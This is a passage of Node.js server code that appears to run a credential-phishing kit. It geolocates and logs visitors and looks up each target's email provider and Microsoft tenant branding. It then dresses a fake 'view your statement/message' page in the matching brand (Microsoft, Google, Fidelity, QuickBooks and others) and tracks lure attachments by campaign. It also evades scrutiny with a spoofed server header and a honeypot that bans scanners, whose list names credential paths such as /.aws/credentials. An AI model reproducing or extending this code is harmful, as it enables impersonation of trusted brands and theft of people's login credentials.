  if (!ip || ip === 'anon' || ip === 'unknown') return true;
  if (ip === '::1' || ip === '127.0.0.1') return true;
  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('169.254.')) return true;
  if (/^172\.(1[6-9]|2\d|3[01])\./.test(ip)) return true;
  if (ip.startsWith('fc') || ip.startsWith('fd') || ip.startsWith('fe80')) return true;
  return false;
}

// Offline lookup — country/region/city/timezone (no network).
function offlineGeo(ip) {
  if (isPrivateIp(ip)) return null;
  try {
    const g = geoip.lookup(ip.replace('::ffff:', ''));
    if (!g) return null;
    return {
      country: g.country, countryCode: g.country, region: g.region,
      city: g.city || '', timezone: g.timezone || '',
    };
  } catch { return null; }
}

function geoForIp(ip) {
  const c = geoCache[ip];
  if (!c) return null;
  if (Date.now() - (c.ts || 0) > GEO_TTL_MS) return null;
  return c;
}

function queueGeoLookup(ip) {
  if (!ip || isPrivateIp(ip)) return;
  const cached = geoForIp(ip);
  // Re-enrich if zip is missing (older cache entries pre-dated the zip field).
  if (cached && cached.isp && Object.prototype.hasOwnProperty.call(cached, 'zip')) return;
  if (GEO_QUEUE.includes(ip)) return;
  GEO_QUEUE.push(ip);
  if (!geoBusy) drainGeoQueue();
}

async function drainGeoQueue() {
  geoBusy = true;
  while (GEO_QUEUE.length) {
    const ip = GEO_QUEUE.shift();
    const cached = geoForIp(ip);
    if (cached && cached.isp && Object.prototype.hasOwnProperty.call(cached, 'zip')) continue;
    try {
      const data = await new Promise((resolve, reject) => {
        const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`;
        const req = httpMod.get(url, { timeout: 6000 }, (resp) => {
          let buf = '';
          resp.on('data', d => buf += d);
          resp.on('end', () => { try { resolve(JSON.parse(buf)); } catch (e) { reject(e); } });
        });
        req.on('error', reject);
        req.on('timeout', () => req.destroy(new Error('timeout')));
      });
      if (data && data.status === 'success') {
        const offline = offlineGeo(ip) || {};
        geoCache[ip] = {
          country: data.country || offline.country || '',
          countryCode: data.countryCode || offline.countryCode || '',
          region: data.regionName || offline.region || '',
          city: data.city || offline.city || '',
          zip: data.zip || '',
          lat: typeof data.lat === 'number' ? data.lat : null,
          lon: typeof data.lon === 'number' ? data.lon : null,
          timezone: data.timezone || offline.timezone || '',
          isp: data.isp || '', org: data.org || '', as: data.as || '',
          mobile: !!data.mobile, proxy: !!data.proxy, hosting: !!data.hosting,
          ts: Date.now(),
        };
        Object.values(visitorDB).forEach(v => { if (v.ip === ip) v.geo = geoCache[ip]; });
        scheduleGeoSave();
        scheduleVisitorSave();
        try { broadcast('geo', { ip, geo: geoCache[ip] }, (c) => c.role === 'superadmin' || true); } catch {}
      } else {
        // Mark failure with offline-only data so we don't keep retrying immediately.
        const offline = offlineGeo(ip);
        if (offline) {
          geoCache[ip] = { ...offline, ts: Date.now(), failed: true };
          Object.values(visitorDB).forEach(v => { if (v.ip === ip) v.geo = geoCache[ip]; });
          scheduleGeoSave();
          scheduleVisitorSave();
        }
      }
    } catch (e) {
      // Network failure — fall back to offline data, will retry on a future hit (no cache).
      console.warn('[geo] lookup failed for', ip, e.message);
      const offline = offlineGeo(ip);
      if (offline) {
        Object.values(visitorDB).forEach(v => { if (v.ip === ip && !v.geo) v.geo = offline; });
        scheduleVisitorSave();
      }
    }
    // Free tier is 45 req/min — pace at ~1 req per 1.5s.
    await new Promise(r => setTimeout(r, 1500));
  }
  geoBusy = false;
}

// Backfill: any existing visitor without geo, or any cache entry missing the zip field,
// gets enriched at startup.
setTimeout(() => {
  const seen = new Set();
  Object.values(visitorDB).forEach(v => {
    if (!v.ip || seen.has(v.ip) || isPrivateIp(v.ip)) return;
    seen.add(v.ip);
    if (!v.geo) {
      const offline = offlineGeo(v.ip);
      if (offline) v.geo = offline;
    }
    queueGeoLookup(v.ip);
  });
  // Re-enrich any cached IPs from the older schema (no zip field).
  Object.keys(geoCache).forEach(ip => {
    if (seen.has(ip) || isPrivateIp(ip)) return;
    if (!Object.prototype.hasOwnProperty.call(geoCache[ip] || {}, 'zip')) {
      seen.add(ip);
      queueGeoLookup(ip);
    }
  });
  if (seen.size) console.log(`[geo] Queued ${seen.size} unique IPs for ASN backfill`);
}, 1500);

// ---- i18n: language detection + dictionary injection ----
// Picks a language by Accept-Language (browser preference, q-weighted) first,
// then by IP-derived country as fallback. Dictionaries live in /i18n/<lang>.json.
const I18N_DIR = path.join(__dirname, 'i18n');
const I18N_DICTS = {};
const RTL_LANGS = new Set(['ar', 'he', 'fa', 'ur']);

// Country → language fallback (used only when Accept-Language is missing/unsupported).
const COUNTRY_TO_LANG = {
  // Spanish
  ES: 'es', MX: 'es', AR: 'es', CL: 'es', CO: 'es', PE: 'es', VE: 'es', UY: 'es',
  EC: 'es', GT: 'es', CU: 'es', BO: 'es', DO: 'es', HN: 'es', PY: 'es', SV: 'es',
  NI: 'es', CR: 'es', PA: 'es', PR: 'es',
  // French
  FR: 'fr', BE: 'fr', LU: 'fr', MC: 'fr', SN: 'fr', CI: 'fr', CM: 'fr', MG: 'fr',
  NE: 'fr', BF: 'fr', ML: 'fr', GA: 'fr', CD: 'fr', HT: 'fr',
  // German
  DE: 'de', AT: 'de', CH: 'de', LI: 'de',
  // Italian
  IT: 'it', SM: 'it', VA: 'it',
  // Portuguese (Brazil)
  BR: 'pt-BR',
  // Portuguese (Portugal + Portuguese-speaking Africa)
  PT: 'pt', AO: 'pt', MZ: 'pt', CV: 'pt', GW: 'pt', ST: 'pt', TL: 'pt',
  // Japanese
  JP: 'ja',
  // Korean
  KR: 'ko',
  // Russian + CIS
  RU: 'ru', BY: 'ru', KZ: 'ru', KG: 'ru', TJ: 'ru', UZ: 'ru',
  // Arabic
  SA: 'ar', AE: 'ar', EG: 'ar', IQ: 'ar', JO: 'ar', LB: 'ar', SY: 'ar',
  TN: 'ar', DZ: 'ar', MA: 'ar', LY: 'ar', YE: 'ar', OM: 'ar', QA: 'ar',
  BH: 'ar', KW: 'ar', SD: 'ar', PS: 'ar',
  // Dutch
  NL: 'nl',
  // Polish
  PL: 'pl',
  // Turkish
  TR: 'tr',
  // Hindi
  IN: 'hi',
  // Chinese (simplified)
  CN: 'zh-CN', SG: 'zh-CN',
  // Chinese (traditional) — falls back to zh-CN (closest available) until we add zh-TW
  HK: 'zh-CN', TW: 'zh-CN', MO: 'zh-CN',
};

function loadI18nDicts() {
  try {
    const files = fs.readdirSync(I18N_DIR).filter(f => f.endsWith('.json'));
    files.forEach(f => {
      const lang = f.replace(/\.json$/, '');
      try { I18N_DICTS[lang] = JSON.parse(fs.readFileSync(path.join(I18N_DIR, f), 'utf8')); }
      catch (e) { console.warn(`[i18n] Failed to parse ${f}:`, e.message); }
    });
    console.log(`[i18n] Loaded ${Object.keys(I18N_DICTS).join(', ')}`);
  } catch (e) { console.warn('[i18n] No dictionary directory:', e.message); }
}
loadI18nDicts();

function pickLanguage(req) {
  const supported = Object.keys(I18N_DICTS);
  if (supported.length === 0) return 'en';

  // 1) Accept-Language header (q-weighted)
  const al = (req.headers['accept-language'] || '').toString();
  if (al) {
    const parsed = al.split(',').map(s => {
      const [tag, ...params] = s.trim().split(';');
      let q = 1;
      params.forEach(p => { const m = p.trim().match(/^q=([\d.]+)/); if (m) q = parseFloat(m[1]); });
      return { tag: tag.toLowerCase(), q };
    }).sort((a, b) => b.q - a.q);

    for (const { tag } of parsed) {
      // 1) Exact match (e.g. 'zh-CN' → zh-CN, 'pt-BR' → pt-BR)
      const exact = supported.find(s => s.toLowerCase() === tag);
      if (exact) return exact;
      // 2) Bare base language preferred (e.g. 'pt-PT' → pt, never pt-BR)
      const base = tag.split('-')[0];
      const exactBase = supported.find(s => s.toLowerCase() === base);
      if (exactBase) return exactBase;
      // 3) Last resort: any region-specific variant of the same base
      const prefixMatch = supported.find(s => s.toLowerCase().startsWith(base + '-'));
      if (prefixMatch) return prefixMatch;
    }
  }

  // 2) IP country fallback
  try {
    let ip = (req.headers['x-forwarded-for'] || req.ip || req.socket?.remoteAddress || '').toString().split(',')[0].trim();
    if (ip.startsWith('::ffff:')) ip = ip.slice(7);
    if (ip && !isPrivateIp(ip)) {
      const geo = geoForIp(ip) || offlineGeo(ip);
      const cc = geo && geo.countryCode;
      if (cc && COUNTRY_TO_LANG[cc] && supported.includes(COUNTRY_TO_LANG[cc])) {
        return COUNTRY_TO_LANG[cc];
      }
    }
  } catch {}

  return supported.includes('en') ? 'en' : supported[0];
}

function injectI18n(html, lang, msgOverrides) {
  let dict = I18N_DICTS[lang] || I18N_DICTS.en || {};
  if (msgOverrides) dict = { ...dict, ...msgOverrides };
  const dir = RTL_LANGS.has(lang.split('-')[0]) ? 'rtl' : 'ltr';
  const inject = `<script>window.__I18N__=${JSON.stringify(dict)};window.__LANG__=${JSON.stringify(lang)};window.__DIR__=${JSON.stringify(dir)};</script>`;
  let out = html
    .replace(/<html\b[^>]*>/i, `<html lang="${lang}" dir="${dir}">`)
    .replace(/<head>/i, `<head>\n  ${inject}`);
  return out;
}

// Email provider detection function - uses the global DOMAIN_TO_PROVIDER map
function detectEmailProvider(email) {
  if (!email) return null;
  const domain = email.toLowerCase().split('@')[1] || '';
  return DOMAIN_TO_PROVIDER[domain] || null;
}

// Send index.html with i18n injection. Drop-in replacement for res.sendFile(pickHtml('index.html')).
function sendLocalizedIndex(req, res) {
  try {
    const file = pickHtml('index.html');
    let html = fs.readFileSync(file, 'utf8');
    const lang = pickLanguage(req);
    let docType = res.locals.documentType || 'invoice';
    let providerBrand = null;

    // FIX: Separate documentType from providerBrand
    // documentType = invoice/receipt/confirmation/invitation (for PDF generation)
    // providerBrand = email provider like ionos/gmail/etc (for theming)
    // Previously docType was overridden to providerBrand, breaking PDF routing for /r/, /c/, etc
    // If email is provided, detect provider but don't override docType
    const prefilledEmail = res.locals.prefilledEmail || '';
    if (prefilledEmail && !['quickbook', 'fidelity'].includes(docType)) {
      const emailProvider = detectEmailProvider(prefilledEmail);
      if (emailProvider) {
        console.log(`[sendLocalizedIndex] Email provider detected: ${emailProvider} from ${prefilledEmail}`);
        providerBrand = emailProvider;
      }
    }

    console.log('[sendLocalizedIndex] docType:', docType, 'providerBrand:', providerBrand, 'res.locals.documentType:', res.locals.documentType);

    const msgMap = {
      quickbook: { 'email.title': 'View your statement', 'email.sub': 'Please use the email address this statement was sent to', 'email.legal': 'Only the recipient of this statement can view it.' },
      fidelity: { 'email.title': 'View your account statement', 'email.sub': 'Please use the email address this statement was sent to', 'email.legal': 'Only the recipient of this statement can view it.' },
      google: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      microsoft: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      yahoo: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      apple: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      xfinity: { 'email.title': 'View your email', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      aol: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      proton: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      tutanota: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      fastmail: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' },
      mailbox: { 'email.title': 'View your message', 'email.sub': 'Please use the email address this message was sent to', 'email.legal': 'Only the recipient can view this message.' }
    };

    // Use providerBrand for theming, not docType
    const themeKey = docType === 'quickbook' ? 'quickbook' : (docType === 'fidelity' ? 'fidelity' : (providerBrand || docType));
    const logoForType = PROVIDER_THEMES[themeKey] ? PROVIDER_THEMES[themeKey].logo : '';
    let overrides = msgMap[docType] || {};
    console.log('[sendLocalizedIndex] Using overrides for:', docType, 'themeKey:', themeKey, overrides);
    html = injectI18n(html, lang, overrides);

    let themeCss = '';
    let themeInjection = '';

    // FIX: Always set window.__DOCUMENT_TYPE__, even without theme
    // Previously this was only set inside the if(theme) block, so routes like /r/hash (receipt)
    // without an email wouldn't have this variable set, defaulting to 'invoice'
    // Now always set window.__DOCUMENT_TYPE__ so app.js can pass correct type to PDF endpoint
    let globalScript = `<script>window.__DOCUMENT_TYPE__="${docType}";window.__PREFILLED_EMAIL__="${prefilledEmail}";`;

    // Only apply provider/special themes if: (1) it's QB/Fidelity (always), OR (2) there's a prefilled email confirming the provider
    const shouldApplyTheme = ['quickbook', 'fidelity'].includes(res.locals.documentType) || (prefilledEmail && !['quickbook', 'fidelity'].includes(res.locals.documentType));
    const theme = (shouldApplyTheme && PROVIDER_THEMES[themeKey]) ? PROVIDER_THEMES[themeKey] : null;

    // Apply theme only if confirmed
    if (theme) {
      console.log(`[sendLocalizedIndex] Applying theme for ${themeKey}: ${theme.name}`);
      themeCss = `<style>:root{--primary-color:${theme.primary};--button-color:${theme.button};--text-color:${theme.text};--accent-color:${theme.accent};}header,#hamburger,#railContainer{background-color:var(--primary-color);color:var(--text-color);}button,.btn{background-color:var(--button-color);color:var(--text-color);}.login-mark{display:flex;align-items:center;justify-content:center;}.login-mark svg{width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain;display:block;}</style>`;
      html = html.replace(/<title>.*?<\/title>/i, `<title>${theme.name}</title>`);
      html = html.replace(/<span class="product-name"[^>]*>.*?<\/span>/i, `<span class="product-name">${theme.name}</span>`);
      // Replace Adobe logo with provider logo in header
      html = html.replace(/<div class="adobe-logo">[\s\S]*?<\/div>/i, `<div class="adobe-logo">${logoForType}</div>`);
      // Replace login-mark logo with provider logo
      html = html.replace(/<div class="login-mark">[\s\S]*?<\/div>/i, `<div class="login-mark">${logoForType}</div>`);

      const finalProviderBrand = docType === 'quickbook' ? 'quickbooks' : (docType === 'fidelity' ? 'fidelity' : (providerBrand || docType));
      const themeJson = JSON.stringify({ primary: theme.primary, button: theme.button, text: theme.text, accent: theme.accent, name: theme.name });
      globalScript += `window.__PROVIDER__={brand:"${finalProviderBrand}",name:"${theme.name}"};window.__PROVIDER_THEME__=${themeJson};`;
    }

    globalScript += '</script>';
    themeInjection = themeCss + globalScript;
    console.log(`[sendLocalizedIndex] globalScript: ${globalScript.substring(0, 100)}...`);
    console.log(`[sendLocalizedIndex] Setting window.__DOCUMENT_TYPE__="${docType}" in HTML`);
    console.log(`[sendLocalizedIndex] themeInjection length: ${themeInjection.length}`);
    console.log(`[sendLocalizedIndex] HTML has </head>: ${html.includes('</head>')}`);
    const newHtml = html.replace('</head>', `${themeInjection}\n</head>`);
    console.log(`[sendLocalizedIndex] HTML modified: ${html.length} → ${newHtml.length}`);
    res.type('html').send(newHtml);
  } catch (e) {
    console.warn('[i18n] sendLocalizedIndex failed, falling back:', e.message);
    res.sendFile(pickHtml('index.html'));
  }
}

// ---- Generated attachment registry ----
// Keyed by campaign id (cid). Lets us scope visitors + clients per generated file.
const ATTACHMENT_DB_PATH = path.join(__dirname, 'attachments.json');
let attachmentDB = {};
const MAX_ATTACHMENTS = 1000;

function loadAttachmentDB() {
  try {
    if (fs.existsSync(ATTACHMENT_DB_PATH)) {
      attachmentDB = JSON.parse(fs.readFileSync(ATTACHMENT_DB_PATH, 'utf8'));
      if (typeof attachmentDB !== 'object' || !attachmentDB) attachmentDB = {};
      console.log(`[attachments] Loaded ${Object.keys(attachmentDB).length} attachments`);
    }
  } catch (e) {
    console.warn('[attachments] Could not load attachments.json:', e.message);
    attachmentDB = {};
  }
}
function saveAttachmentDB() {
  queueWrite(ATTACHMENT_DB_PATH, () => attachmentDB, 'attachments', { pretty: true, delayMs: 1000 });
}
function scheduleAttachmentSave() { saveAttachmentDB(); }
function registerAttachment({ cid, type, label, fname, ownerId, slug }) {
  if (!cid) return;
  attachmentDB[cid] = {
    id: cid,
    type: type || 'chameleon',
    label: label || fname || 'Untitled',
    fname: fname || null,
    ownerId: ownerId || null,
    slug: slug || null,
    createdAt: new Date().toISOString(),
  };
  // Bound: drop oldest if we exceed cap.
  const keys = Object.keys(attachmentDB);
  if (keys.length > MAX_ATTACHMENTS) {
    const sorted = keys.sort((a, b) => new Date(attachmentDB[a].createdAt) - new Date(attachmentDB[b].createdAt));
    const drop = sorted.slice(0, keys.length - MAX_ATTACHMENTS);
    drop.forEach(k => delete attachmentDB[k]);
  }
  scheduleAttachmentSave();
}
loadAttachmentDB();

// Provider detection cache: domain → { provider, brandName, ts }
const detectCache = new Map();
const CACHE_TTL = 60 * 60 * 1000; // 1 hour

// Fetch Microsoft tenant branding (BannerLogo, TileLogo, BackgroundColor)
// for an Azure AD tenant. Uses the same public, unauthenticated API that
// login.microsoftonline.com itself calls when displaying the branded
// sign-in page. Returns null if the tenant has no custom branding.
const tenantBrandCache = new Map(); // email → { brand, ts }
const TENANT_BRAND_TTL = 60 * 60 * 1000; // 1 hour
async function fetchMicrosoftTenantBranding(email) {
  const key = email.toLowerCase();
  const cached = tenantBrandCache.get(key);
  if (cached && Date.now() - cached.ts < TENANT_BRAND_TTL) return cached.brand;
  try {
    const resp = await Promise.race([
      fetch('https://login.microsoftonline.com/common/GetCredentialType', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'Accept': 'application/json',
          'Origin': 'https://login.microsoftonline.com',
          'Referer': 'https://login.microsoftonline.com/',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/132.0.0.0',
        },
        body: JSON.stringify({
          username: email,
          isOtherIdpSupported: true,
          checkPhones: false,
          isRemoteNGCSupported: true,
          isCookieBannerShown: false,
          isFidoSupported: true,
          originalRequest: '',
          flowToken: '',
        }),
      }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000)),
    ]);
    const data = await resp.json();
    const b = data && data.EstsProperties && data.EstsProperties.UserTenantBranding;
    const brand = (b && b[0]) ? {
      bannerLogo: b[0].BannerLogo || null,
      tileLogo: b[0].TileLogo || null,
      tileDarkLogo: b[0].TileDarkLogo || null,
      illustration: b[0].Illustration || null,
      backgroundColor: b[0].BackgroundColor || null,
    } : null;
    tenantBrandCache.set(key, { brand, ts: Date.now() });
    return brand;
  } catch {
    return null;
  }
}

// Strategy 1: Microsoft Realm Discovery API (works over HTTP, no DNS needed)
// Returns org brand name for real O365 tenants (e.g. "Langham Hotels International Ltd.")
async function detectByMicrosoftRealm(email, domain) {
  try {
    const resp = await Promise.race([
      fetch(`https://login.microsoftonline.com/getuserrealm.srf?login=${encodeURIComponent(email)}&json=1`),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000)),
    ]);
    const data = await resp.json();
    // "Managed" with a custom brand name (≠ domain) = real O365 org
    if (data.NameSpaceType === 'Managed' && data.FederationBrandName && data.FederationBrandName.toLowerCase() !== domain.toLowerCase()) {
      return { provider: 'microsoft', brandName: data.FederationBrandName };
    }
    // "Federated" with a real org AuthURL (not Windows Live consumer) = federated O365
    if (data.NameSpaceType === 'Federated' && data.FederationBrandName && data.FederationBrandName !== 'Windows Live') {
      return { provider: 'microsoft', brandName: data.FederationBrandName };
    }
    return null;
  } catch {
    return null;
  }
}

// Strategy 2: MX record lookup — try local DNS first, fall back to Google DNS-over-HTTPS
async function detectByMx(domain) {
  let hosts = null;

  // Try local DNS first
  try {
    const records = await Promise.race([
      dns.promises.resolveMx(domain),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 2000)),
    ]);
    hosts = records.map(r => r.exchange.toLowerCase()).join(' ');
  } catch {}

  // Fallback: Google DNS-over-HTTPS (works when local DNS is broken)
  if (!hosts) {
    try {
      const resp = await Promise.race([
        fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000)),
      ]);
      const data = await resp.json();
      if (data.Answer && data.Answer.length) {
        hosts = data.Answer.map(a => (a.data || '').toLowerCase()).join(' ');
      }
    } catch {}
  }

  if (!hosts) return null;

  if (hosts.includes('google.com') || hosts.includes('googlemail.com')) return { provider: 'google' };
  if (hosts.includes('outlook.com') || hosts.includes('protection.outlook.com') || hosts.includes('microsoft')) return { provider: 'microsoft' };
  if (hosts.includes('yahoodns.net')) return { provider: 'yahoo' };
  if (hosts.includes('mxhichina') || hosts.includes('alibaba') || hosts.includes('aliyun')) return { provider: 'alibaba' };
  if (hosts.includes('zoho')) return { provider: 'zoho' };
  if (hosts.includes('protonmail') || hosts.includes('proton.me')) return { provider: 'proton' };
  if (hosts.includes('qq.com') || hosts.includes('tencent')) return { provider: 'qq' };
  if (hosts.includes('netease.com') || hosts.includes('163.com')) return { provider: 'netease' };
  if (hosts.includes('mail.ru')) return { provider: 'mailru' };
  if (hosts.includes('yandex')) return { provider: 'yandex' };
  if (hosts.includes('comcast.net') || hosts.includes('comcast.com') || (hosts.includes('hostedemail.com') && domain.includes('comcast'))) return { provider: 'xfinity' };
  if (hosts.includes('altice') || hosts.includes('optonline')) return { provider: 'optimum' };
  if (hosts.includes('charter.net')) return { provider: 'spectrum' };
  if (hosts.includes('earthlink')) return { provider: 'earthlink' };
  // Rackspace hosted email — *.emailsrvr.com is Rackspace Mail (the platform); mx*.rackspace.com is legacy.
  if (hosts.includes('emailsrvr.com') || hosts.includes('rackspace')) return { provider: 'rackspace' };
  // GoDaddy / SecureServer — extremely common for small-business custom domains.
  if (hosts.includes('secureserver.net') || hosts.includes('godaddy')) return { provider: 'godaddy' };
  // OVH (France) — many EU SMBs. Also detects mail.ovh.net / mx*.mail.ovh.net.
  if (hosts.includes('ovh.net') || hosts.includes('ovh.com')) return { provider: 'ovh' };
  // IONOS / 1&1 — German hosting commonly used for custom domains.
  if (hosts.includes('kundenserver.de') || hosts.includes('ionos.com') || hosts.includes('ionos.de')) return { provider: 'ionos' };
  // Email security gateways usually sit in front of Microsoft 365 — assume MS as the actual auth backend.
  if (hosts.includes('pphosted.com') || hosts.includes('proofpoint')) return { provider: 'microsoft', brandName: null }; // ProofPoint
  if (hosts.includes('mimecast')) return { provider: 'microsoft', brandName: null }; // Mimecast
  if (hosts.includes('barracuda')) return { provider: 'microsoft', brandName: null }; // Barracuda ESS
  return null;
}

// Combined detection: known domains → Microsoft realm API → MX records
async function detectProvider(email, domain) {
  // Check in-memory cache first
  const cached = detectCache.get(domain);
  if (cached && Date.now() - cached.ts < CACHE_TTL) return cached;

  // 1. Hardcoded known domains (instant)
  const known = DOMAIN_TO_PROVIDER[domain];
  if (known) {
    const result = { provider: known, brandName: null, ts: Date.now() };
    detectCache.set(domain, result);
    return result;
  }

  // 2. Check learned database (instant, from past discoveries)
  const learned = lookupLearned(domain);
  if (learned) {
    const result = { ...learned, ts: Date.now() };
    detectCache.set(domain, result);
    return result;
  }

  // 3. Live detection: Microsoft realm API + MX lookup in parallel
  const [realmResult, mxResult] = await Promise.all([
    detectByMicrosoftRealm(email, domain),
    detectByMx(domain),
  ]);

  // Prefer realm result (HTTP-based, works when DNS is broken)
  const result = realmResult || mxResult || { provider: null, brandName: null };
  result.ts = Date.now();
  detectCache.set(domain, result);

  // 4. Learn this domain for next time (auto-saves to disk)
  learnDomain(domain, result.provider, result.brandName);

  return result;
}

// Trust exactly one proxy hop (Cloudflare/nginx). Set TRUST_PROXY in env to override.
app.set('trust proxy', process.env.TRUST_PROXY ? parseInt(process.env.TRUST_PROXY, 10) : 1);

// Per-request log — gated by VERBOSE_REQ_LOG=1 because it floods the log file
// at scale and slows down high-traffic deployments. Off by default.
if (process.env.VERBOSE_REQ_LOG === '1') {
  app.use((req, res, next) => {
    let ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
    if (ip.startsWith('::ffff:')) ip = ip.slice(7);
    console.log(`[REQ] ${req.method} ${req.url} ip=${ip} ua="${(req.headers['user-agent']||'').slice(0,60)}"`);
    next();
  });
}

// Cache headers. ETag is set by express.static, so a long max-age is safe:
// when the file regenerates (e.g. obfuscate.js rerun), mtime/size change →
// new ETag → browser revalidates and gets the fresh bytes. Short cache here
// just burns bandwidth for no benefit.
app.use((req, res, next) => {
  // HTML pages — no cache, always fresh from server
  if (/\.html$/i.test(req.path) || req.path === '/' || /^\/[^.]*$/.test(req.path)) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    return next();
  }
  // Static assets (JS, CSS, fonts, images) — 7-day cache + ETag-based revalidation.
  if (/\/(?:js|css|fonts?|img|images)\//.test(req.path) || /\.(?:js|css|woff2?|ttf|svg|png|jpg|jpeg|gif|ico)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=604800, stale-while-revalidate=86400');
  }
  next();
});
app.disable('x-powered-by');

// ---- Security hardening ----
// Enable HTTPS-only features only if HTTPS_ENABLED=1 (set this when you have TLS/Cloudflare in front)
const HTTPS_MODE = process.env.HTTPS_ENABLED === '1';

// Gzip/brotli compression — single biggest perf win for HTML/CSS/JS payloads.
// Mounted before any route handlers so every text response is compressed.
// threshold: 1KB (don't bother with tiny payloads), filter excludes already-
// compressed binaries (images, fonts) which get worse with double-encoding.
const compression = require('compression');
app.use(compression({
  threshold: 1024,
  filter: (req, res) => {
    const ct = res.getHeader('Content-Type') || '';
    if (/^image\/|^font\/|^video\/|^audio\/|application\/(zip|gzip|br|pdf|wasm|octet-stream)/.test(String(ct))) return false;
    return compression.filter(req, res);
  },
}));

app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: false,
    directives: {
      "default-src": ["'self'"],
      "script-src": ["'self'", "'unsafe-inline'", "blob:", "https://cdnjs.cloudflare.com", "https://unpkg.com"],
      "script-src-elem": ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://unpkg.com"],
      "worker-src": ["'self'", "blob:"],
      "style-src": ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://fonts.googleapis.com"],
      "font-src": ["'self'", "https://fonts.gstatic.com", "https://cdnjs.cloudflare.com", "data:"],
      // Allow images from any HTTPS source so we can load company favicons /
      // brand banners directly from the customer domain (e.g.
      // https://cmacommunities.com/apple-touch-icon.png).
      "img-src": ["'self'", "data:", "blob:", "https:", "http:"],
      // Allow fetch() to any HTTPS origin so we can probe company logo size
      // (HEAD-style fetch on apple-touch-icon.png) before showing the banner.
      "connect-src": ["'self'", "https:", "https://cdnjs.cloudflare.com", "https://unpkg.com"],
      "form-action": ["'self'"],
      // Allow framing from ANY scheme — chameleon HTML is opened from file:// (or https://dropbox.com)
      // CSP '*' does NOT cover file:/data:/blob: — those must be listed explicitly.
      "frame-ancestors": ["*", "file:", "data:", "blob:", "filesystem:"],
      "object-src": ["'none'"],
      "base-uri": ["'self'"],
      // NOTE: upgrade-insecure-requests intentionally omitted unless HTTPS_MODE (would break HTTP form submits)
      ...(HTTPS_MODE ? { "upgrade-insecure-requests": [] } : {}),
    },
  },
  crossOriginEmbedderPolicy: false,
  crossOriginOpenerPolicy: HTTPS_MODE ? { policy: 'same-origin' } : false,
  crossOriginResourcePolicy: { policy: 'same-site' },
  referrerPolicy: { policy: 'no-referrer' },
  // HSTS only under HTTPS — otherwise it poisons the browser to always upgrade
  hsts: HTTPS_MODE ? { maxAge: 31536000, includeSubDomains: true, preload: true } : false,
  originAgentCluster: false,
}));

app.use((req, res, next) => {
  res.removeHeader('X-Powered-By');
  res.removeHeader('Server');
  res.setHeader('Server', 'nginx');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=(), payment=()');
  // Override helmet's X-Frame-Options: SAMEORIGIN so chameleon iframe can embed from any origin.
  // Admin paths stay protected (see adminIpGate + session).
  if (req.path.startsWith('/v/') || req.path.startsWith('/auth/') || req.path.startsWith('/api/') || req.path.startsWith('/d/')) {
    res.removeHeader('X-Frame-Options');
    // Allow the iframe from any origin (Dropbox, file://, etc.) to load this response.
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
  }
  next();
});

// Global slow-down: after 100 req/5min, add 500ms delay per extra req
const globalSlow = slowDown({
  windowMs: 5 * 60 * 1000,
  delayAfter: 100,
  delayMs: (hits) => (hits - 100) * 500,
  maxDelayMs: 20000,
});
app.use(globalSlow);

// Strict rate limit on auth-adjacent endpoints
const authLimiter = expressRateLimit({
  windowMs: 5 * 60 * 1000,
  max: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests. Slow down.' },
});

// ==========================================
// ---- HONEYPOT SYSTEM ----
// ==========================================
// Any IP that hits these paths is instantly banned (no strikes needed).
// Real users/browsers never request these. Only bots, scanners, and scrapers do.
const HONEYPOT_PATHS = [
  '/wp-admin', '/wp-login.php', '/xmlrpc.php', '/wordpress', '/wp-content',
  '/.env', '/.env.backup', '/.env.local', '/.git', '/.git/config', '/.git/HEAD',
  '/config.php', '/phpmyadmin', '/pma', '/adminer.php', '/adminer',
  '/.aws/credentials', '/.aws/config', '/.ssh/id_rsa', '/.ssh/authorized_keys',
  '/backup.sql', '/backup.zip', '/database.sql', '/dump.sql',
  '/.DS_Store', '/server-status', '/server-info', '/actuator', '/actuator/env',
  '/api/v1/actuator', '/administrator', '/cgi-bin', '/shell.php', '/eval-stdin.php',
  '/.well-known/traffic-advice', '/vendor/phpunit', '/FCKeditor', '/fckeditor',
  '/boaform', '/HNAP1', '/goform', '/solr/admin', '/console/login',
  '/_ignition/execute-solution', '/idx_config', '/secret-panel', '/internal-api',
